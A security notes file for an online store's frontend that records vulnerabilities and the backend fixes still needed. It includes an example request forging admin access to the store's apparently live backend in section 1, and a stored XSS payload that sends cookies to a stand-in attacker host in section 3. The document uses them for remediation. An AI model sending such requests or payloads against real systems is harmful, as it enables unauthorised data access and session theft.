# Security notes — OJ || studios

This file records the security issues found in the frontend, what was fixed
here, and what **must** be fixed in the backend (`backendroutes-lcpt.onrender.com`,
a separate repository) before this store can be considered safe.

The frontend has been prepared for every backend change listed below, so the
server side can be done without touching this repo again.

---

## 1. There is no authentication — only a claimed `userId` ⚠️ BACKEND REQUIRED

**Status: NOT FIXED. This is the most serious issue.**

Login stores a user id and every privileged request sends that id in the JSON
body. A user id is not a secret. Any visitor can open devtools and send:

```js
fetch("https://backendroutes-lcpt.onrender.com/admin/orders", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ userId: 1, isAdmin: true }),
});
```

If the server answers, your entire order and customer list is public. The same
applies to every user route: passing someone else's `userId` to `/ojcartget`,
`/ojorders`, or `/ojuser` returns their data (an IDOR).

**The client cannot fix this.** It has no secret to prove who it is.

### What the backend must do

1. On successful `/loginoj` and `/admin/login`, issue a signed token
   (JWT with a short expiry, or a `HttpOnly; Secure; SameSite=Strict` session
   cookie) and return it as `token` in the JSON response.
2. On **every** protected route, read the token, verify the signature, and
   derive the user id **from the token** — never from the request body.
3. Check the role server-side for `/admin/*`. Never trust an `isAdmin` field
   sent by the client.
4. Reply `401` for a missing/invalid token and `403` for a valid token without
   permission.

### What the frontend already does

- `OJ.Auth.setSession()` in `app-core.js` stores `token`, `accessToken`, or
  `jwt` from the login response automatically.
- `OJ.api()` sends it as `Authorization: Bearer <token>` on every request.
- A `401`/`403` clears the session and surfaces a "please sign in again"
  message instead of silently showing a broken page.
- `admin.html` no longer trusts `sessionStorage.isAdmin`. On load it calls
  `/admin/stats` and only reveals the dashboard if the **server** answers.
  It fails closed.

Once the backend issues tokens, no frontend change is needed.

---

## 2. Order totals are computed in the browser ⚠️ BACKEND REQUIRED

**Status: NOT FIXED (server-side by nature).**

The cart subtotal, the shipping cost, and the final total are all calculated in
`script.js` and handed to Paystack as the amount to charge. A user can edit
those values before paying.

### What the backend must do

In `/verify-payment`:

1. Re-read the user's cart **from the database**, not from `paymentData.cartItems`.
2. Recompute the subtotal from database prices, and the shipping cost from a
   server-side table keyed on `shipping_region`.
3. Call the Paystack verify API and compare the **actual amount captured**
   against the recomputed total.
4. Reject and refund on mismatch. Only create the order when they agree.

The frontend now also sends `shipping_region` and `shipping_cost` so the server
can check the client's arithmetic against its own.

---

## 3. Stored XSS into the admin dashboard ✅ FIXED

`admin.html` rendered customer names and emails into `innerHTML` unescaped.
A user could register with a name like `<img src=x onerror="fetch('//attacker/'+document.cookie)">`
and it would execute in the admin's browser, with the admin's session.

All backend-supplied values are now passed through `OJ.escapeHtml()` (and
`OJ.safeUrl()` for image sources, which also rejects `javascript:` URLs).
This applies to `admin.html`, `acc.html`, `signup.html`, `login.html`, and the
product/cart rendering in `script.js`.

**Defence in depth still worth adding:** validate name/email format on the
server at registration.

---

## 4. Password policy ✅ PARTLY FIXED

Signup had no password requirements at all — an empty-ish password was accepted
if the browser allowed it. The account page required only 6 characters.

Both now require **8 characters minimum**, enforced client-side with
`minlength` plus a JS check.

**The backend must enforce the same minimum** — client validation is a UX
convenience, not a control. Also confirm passwords are hashed with bcrypt/argon2
and never stored or logged in plaintext.

---

## 5. No password reset, no email verification ⚠️ BACKEND REQUIRED

**Status: NOT BUILT — needs backend endpoints first.**

There is currently no way for a customer who forgets their password to recover
their account, and email addresses are never verified.

Deliberately **not** stubbed in the UI: a "forgot password" link that goes
nowhere is worse than none. Once these endpoints exist, wire them up:

- `POST /request-password-reset` → emails a single-use, time-limited token
- `POST /reset-password` → consumes the token, sets the new password
- `POST /verify-email` → confirms ownership at signup

---

## 6. Public keys in source ✅ NOT A PROBLEM

`pk_live_...` (Paystack) and `9njw5PNNC3JuIC3ot` (EmailJS) are **publishable**
keys and are meant to be in client code.

Two caveats worth acting on:

- Confirm the Paystack **secret** key (`sk_live_...`) lives only in backend
  environment variables. It must never appear in this repo.
- Lock the EmailJS public key to your domain in the EmailJS dashboard, or
  anyone can send mail through your templates and burn your quota.

---

## Priority order

| # | Issue | Owner | Severity |
|---|-------|-------|----------|
| 1 | Token auth on all routes | backend | **Critical** |
| 2 | Server-side total verification | backend | **Critical** |
| 5 | Password reset / email verification | backend | High |
| 4 | Server-side password rules | backend | Medium |
| 6 | EmailJS domain lock | dashboard | Low |
| 3 | Admin XSS | frontend | ✅ done |
